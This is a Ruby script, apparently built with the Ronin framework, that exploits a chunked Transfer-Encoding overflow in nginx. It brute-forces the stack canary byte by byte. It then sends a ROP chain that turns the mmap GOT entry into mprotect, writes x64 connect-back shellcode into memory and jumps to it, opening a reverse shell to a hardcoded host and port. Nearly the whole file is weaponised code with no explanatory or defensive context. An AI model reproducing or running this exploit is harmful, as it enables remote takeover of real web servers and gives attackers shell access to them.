# encoding: ASCII
abort("#{$0} host port") if ARGV.length < 2
require 'ronin'

$count = 0

# rop address taken from nginx binary (find in the repo)
poprdi = 0x00427006 
poprsi = 0x0043a00e 
poprdx = 0x0041b8fa 
poprax = 0x00442c80 

mmap64   = 0x4029b0
mmapgot  = 0x67f290
mmapaddr = 0x00410000

rsito_rax_ = 0x0042afcb
add_rdi_al = 0x00462de4

# change mmap64 to mprotect, easier to find gadget
$ropchain = [
    poprax, 0x60,
    poprdi, mmapgot,
    add_rdi_al,
    
    poprax, mmapgot,
    poprdx, 0x7,
    poprsi, 0x1000,
    poprdi, mmapaddr,
    mmap64
].pack(
  :uint64, :uint64,
  :uint64, :uint64,
  :uint64,

  :uint64, :uint64,
  :uint64, :uint64,
  :uint64, :uint64,
  :uint64, :uint64,
  :uint64
)

#connect back shellcode x64
ip = "1.1.1.1" 
port = 4000
sip = IPAddr::new(ip).to_i.pack(:int_be)
sport = port.pack(:int16_be)
$shellcode  = "\x48\x31\xd2\x48\x31\xc0\xb2\x02\x48\x89\xd7\xb2\x01\x48\x89\xd6\xb2\x06\xb0\x29\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\xbb#{sip}\x48\xc1\xe3\x20\x66\xb8#{sport}\xc1\xe0\x10\xb0\x02\x48\x09\xd8\x50\x48\x89\xe6\x48\x31\xd2\xb2\x10\x48\x31\xc0\xb0\x2a\x0f\x05\x48\x31\xf6\x48\x31\xc0\xb0\x21\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xf6\x48\x31\xd2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05\xc3"

$shellcode << ("\x90" * (8 - ($shellcode.length % 8)))

# copy the shellcode to mmapaddr
(0...$shellcode.length).step(8) { |p|
    code = $shellcode[p,8].unpack(:uint64)[0]
    chain = [poprax, mmapaddr + p, poprsi, code, rsito_rax_].pack(
      :uint64, :uint64, :uint64, :uint64, :uint64
    )
    $ropchain << chain
}

# finally jump to it
$ropchain << mmapaddr.pack(:uint64)

# payload for crash
$payload = [ 
   "GET / HTTP/1.1\r\n",
   "Host: 1337.vnsec.net\r\n",
   "Accept: */*\r\n",
   "Transfer-Encoding: chunked\r\n\r\n"
].join
$chunk = "f"*(1024-$payload.length-8) + "0f0f0f0f"
$payload << $chunk

def crash(cookie, cookie_test=true)
  data = ''
  5.times do
    payload = $payload
    tcp_connect(ARGV[0],ARGV[1].to_i) do |s|
      $count += 1
      payload << ["A"*(4096+8), cookie].join
      payload << ["C"*24, $ropchain].join if not cookie_test

      s.send(payload,0)

      data = s.recv(10)
      s.close
    end

    return true if data.strip.length == 0
  end

  return false
end

s = [0]
if ARGV.length < 3
  # test cookie
  while s.length < 8
    print_info "searching for byte: #{s.length}"
    (1..255).each do |c|
      print "\r#{c}"
      s1 = s + [c]

      unless crash(s1.pack("C*"))
        s << c
        puts
        break
      end
    end
  end
  s = s.pack("c*")
else
  # try it ?
  s = (ARGV[2]).gsub("\\x","").hex_decode

  if crash(s)
    print_error "Wrong cookie"
    exit
  end
end

print_info "Found cookie: #{s.hex_escape} #{s.length}"

print_info "PRESS ENTER TO GIVE THE SHIT TO THE HOLE AT #{ip} #{port}"
gets 

crash(s,false)
print_info "#{$count} connections"
